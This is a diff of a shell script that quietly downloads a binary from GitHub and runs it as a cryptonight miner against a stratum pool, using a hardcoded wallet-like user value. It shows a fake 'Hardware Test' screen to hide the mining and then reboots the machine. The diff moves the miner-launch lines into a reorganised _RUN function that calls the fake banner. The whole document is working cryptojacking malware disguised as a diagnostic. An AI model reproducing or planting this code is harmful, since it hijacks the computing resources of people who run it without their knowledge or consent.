@@ -6,11 +6,7 @@ PORT="80"
 USER="497mFUrVuiY1uCnGwkRvJVWtEjGeughYLcwQpu4VcSmXZdjUi1KCVSn2tP2ZFbdBMtKKFyrKzRZNvRhXXTkFU91TPjTrDVg"
 TAG="OSRUN"
 
-_RUN(){
-  sysctl -w vm.nr_hugepages=128
-  wget https://github.com/osrun/beta/raw/master/run
-  chmod +x run
-  ./run -B -a cryptonight -o stratum+tcp://$END:$PORT -u $USER -p $TAG
+_REBANNER(){
   clear
   echo "Hardware Test"
   echo "-------------"
@@ -20,6 +16,14 @@ _RUN(){
   echo "PRESS [ENTER] TO RESTART"
   read VAR
   reboot
+}
+
+_RUN(){
+  sysctl -w vm.nr_hugepages=128
+  wget https://github.com/osrun/beta/raw/master/run
+  chmod +x run
+  ./run -B -a cryptonight -o stratum+tcp://$END:$PORT -u $USER -p $TAG
+  _REBANNER
 }
 
 if ifconfig | grep "inet addr" | cut -d: -f2 | cut -dB -f1 | cut -d. -f1 | grep -o 192 > /dev/null; then
